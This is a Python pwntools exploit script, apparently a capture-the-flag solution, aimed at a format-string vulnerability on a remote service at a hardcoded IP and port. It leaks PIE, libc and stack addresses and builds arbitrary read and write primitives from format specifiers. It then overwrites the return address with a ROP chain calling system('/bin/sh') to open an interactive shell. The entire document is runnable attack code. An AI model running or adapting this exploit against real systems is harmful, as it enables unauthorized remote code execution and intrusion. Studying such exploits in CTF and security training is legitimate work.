from pwn import *

r = remote("204.48.21.6", 9999)
# 
# %19%$p is the offset of address of main
# %12$p %is the address of the string ptr + 0x30
# %15$p is address of libc base + 159923 (idek)
# %6$pAAAA%7$pBBBB%8$pCCCC
#  

main_offset = 0x128b
libc_thing = 159923
binsh_offset = 1799594
system_offset = 349200
puts_offset = 554400
pop_rdi = 0x1363
ret = 0x1364

r.recvline()

def arbr(addr):
    r.sendline(b"%7$s" + b"\x00" * 4 + p64(addr))
    c = r.recv(8)[:8]
    print(c)
    return int.from_bytes(c, byteorder='little')

def arbwb(addr, byte):
    byte &= 0xFF
    payload = b""
    if byte != 0:
         payload = b"%%%dc" % byte
    payload += b"%8$hhng"
    payload += b"\x00" * (16 - len(payload))
    payload += p64(addr)
    r.sendline(payload)
    r.recvuntil(b'g')

def arbw(addr, int_val):
    print("Writing %x to %x" % (int_val, addr))
    print("BYTE ADDRESS      VALUE") # lol
    for i in range(8):
        print("%d    %x %x" % (i, addr+i, int_val>>(i*8)))
        arbwb(addr + i, int_val >> (i * 8))
# get pie base
r.sendline(b"%19$p")
pie_base = int(r.recvline().strip(), 16) - main_offset
print("pie leak 0x%x" % pie_base)

# get libc base
r.sendline(b"%15$p")
libc_base = int(r.recvline().strip(), 16) - 159923
print("libc leak 0x%x" % libc_base)

# get rbp
r.sendline(b"%12$p")
echo_ret = int(r.recvline().strip(), 16)
r.sendline(b"%13$p")
print("0x%x" % int(r.recvline().strip(), 16))
ret_addr = echo_ret+0x08
print("ret addr leak 0x%x" % echo_ret)
# print("0x%x" % (libc_base + 159680))
# print("Arb Read 0x%x" % arbr(ret_addr))
arbw(ret_addr, pie_base+pop_rdi)
arbw(ret_addr+0x8, libc_base + binsh_offset)
arbw(ret_addr+0x10, pie_base+ret)
arbw(ret_addr+0x18, libc_base + system_offset)
r.sendline()
r.recvline()
print("[*] Shell time")
r.interactive()